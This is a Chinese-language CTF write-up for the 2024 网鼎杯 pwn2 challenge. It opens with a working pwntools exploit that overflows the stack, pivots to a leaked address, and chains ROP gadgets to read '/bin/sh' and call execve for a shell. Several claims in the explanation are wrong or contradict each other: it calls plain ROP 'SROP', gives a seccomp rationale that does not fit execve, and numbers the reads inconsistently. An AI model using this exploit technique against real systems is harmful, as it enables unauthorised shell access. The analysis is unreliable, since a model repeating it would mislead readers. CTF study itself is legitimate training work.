# 2024 网鼎杯玄武组 pwn2 题目详解

```python
rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdxrbx = 0x0000000000485feb
sh_addr = 0x00000000004C5000
read = 0x000000000044F810
syscall = 0x41ac26

p = process('/home/kali/Desktop/pwn')
p.recvuntil(b'gift: ')
gift = p.recv(18)
gift = int(gift, 16)

# Step 1: leave your name
p.sendafter('leave your name', b'a' * 0x28 + p64(1))
# Step 2: Wanna return?
p.sendafter('Wanna return?', 'A')
# Step 3: once again? - 第一次 read 触发
p.sendafter("once again?", b'A' * 0x100)

# Step 4: 二次溢出 payload
payload = b'A' * 0x60
payload += p64(0x1111111111111111)
payload += b'B' * 0xa0
payload += p64(gift)
payload += b'C' * 8
# read(0, sh_addr, 0x10)
payload += p64(rax) + p64(0x0) + p64(rdxrbx) + p64(0x10) * 2 + p64(rsi) + p64(sh_addr) + p64(rdi) + p64(0x0) + p64(syscall)
# execve(sh_addr, 0, 0)
payload += p64(rax) + p64(0x3B) + p64(rdi) + p64(sh_addr) + p64(rsi) + p64(0x0) + p64(rdxrbx) + p64(0x0) * 2 + p64(syscall)

p.sendafter("once again?", payload)
p.send(b'/bin/sh')
p.interactive()
```

## 攻击链分析

1. **第 1 次 read**（"leave your name"）：0x28 字节 + p64(1) 覆盖某标志位到 1，触发后续菜单。  
2. **第 2 次 read**（"once again?"）：触发 `read(0, &buf, 0x100)` 栈溢出，但此时栈底已被前次 read 写过 rbp-0x28 标志位。  
3. **第 3 次 read**（"once again?" 二次）：覆盖返回地址到 `gift`（栈迁移），再 ROP 链走 SROP：

```python
# 第一段 SROP: read(0, sh_addr=0x4C5000, 0x10)
rax=0; rdxrbx=0x10; rsi=sh_addr; rdi=0
syscall   # read 0x10 字节到 sh_addr

# 第二段 SROP: execve("/bin/sh", 0, 0)
rax=0x3B; rdi=sh_addr; rsi=0; rdxrbx=0
syscall   # execve
```

`gift` 来自程序输出的栈地址，作为新的 ROP 起点。`rax=0x450277` 是 `pop rax; ret`，`rdi/rsi/rdxrbx/syscall` 都是经典 SROP gadget。

## 总结

- 二次 read 触发二次栈溢出，flag 位 + 二次 read 双重利用。  
- 通 gadget 链 (`rax / rdi / rsi / rdxrbx / syscall`) 是大型 glibc 程序里最常见的 ROP 套路。  
- read 后 execve 而不是 system，是因为开了 seccomp 禁了 system 系列 syscall。
